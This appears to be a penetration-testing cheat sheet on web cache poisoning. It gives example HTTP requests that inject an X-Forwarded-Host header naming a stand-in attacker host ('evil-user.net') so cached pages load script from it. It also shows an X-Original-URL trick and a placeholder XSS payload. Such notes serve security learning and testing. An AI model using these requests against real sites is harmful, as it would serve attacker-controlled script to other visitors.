 # Web Cache Poisoning

> Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.

>Fundamentally, web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims.

>A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on. 

## Summary

- [Web Cache Poisoning](#web-cache-poisoning)
  - [Summary](#summary)
  - [Exploit 1](#exploit-1)
    - [Headers to test](#headers-to-test)
  - [Exploit 2](#exploit-2)
  - [References](#references)


## Exploit 1

:fire: **example :** 

**note :** 

Add a cache buster query parameter, such as `?cb=1234`
so you don't make a damage to the website

***Request***
```bash
GET / HTTP/1.1
Host: innocent-website.com
```
***Modified Request***
```bash
GET /?cb=1234 HTTP/1.1
Host: innocent-website.com
```

**to see if this website is vulnerable** 

Add X-Forwarded-Host header with an arbitrary hostname, such as `evil-user.net`

***Request***
```bash
GET / HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
```

***Response:***

```bash
HTTP/1.1 200 OK
<script src="https://innocent-website.com/static/analytics.js"></script>
```

***Modified Request:***

```bash
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0
```

***Response:***

```bash
HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

Replay the request and observe that the response contains the header `X-Cache: hit`. This tells us that the response came from the cache.

### Headers to test

```bash
X-Host
X-Forwarded-Host
```
## Exploit 2 

**lets say there is multiple languages in the website and the only vulnerable page is the spanish version 'ES'**

**We can use another trick to make the user visit the spanish version**

:fire: **Example :**

***Request***
```bash
GET /lang=EN HTTP/1.1
Host: innocent-website.com
```
***Response***
```bash
HTTP/1.1 200 OK
…

<body>
<h1>Hello World!<h1>
</body>
```

***Modified Request***
```bash
GET /lang=EN HTTP/1.1
Host: innocent-website.com
X-Original-URL: /lang=ES
```
***Response***
```bash
HTTP/1.1 200 OK
…

<body>
<h1>Hola Mundo!<h1>
#<script> XSS HERE </script>
</body>
```
## References
* [Portswigger](https://portswigger.net/web-security/web-cache-poisoning/exploiting)
